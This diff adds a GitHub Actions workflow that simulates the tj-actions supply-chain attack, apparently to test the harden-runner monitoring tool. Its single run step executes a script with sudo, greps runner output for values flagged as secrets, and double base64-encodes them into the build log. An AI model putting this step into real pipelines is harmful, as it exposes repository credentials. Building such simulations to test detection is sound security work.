@@ -1,0 +1,18 @@
+name: Workflow for POCs
+on:
+  workflow_dispatch:
+
+jobs:
+  tj-actions-simulation:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: step-security/harden-runner@rc
+        with:
+         egress-policy: audit
+     
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Execute tj-action
+        run: | 
+          sudo python3 tj.py | tr -d '\0' | grep -aoE '"[^"]+":\{"value":"[^"]*","isSecret":true\}' | sort -u | base64 -w 0 | base64 -w 0
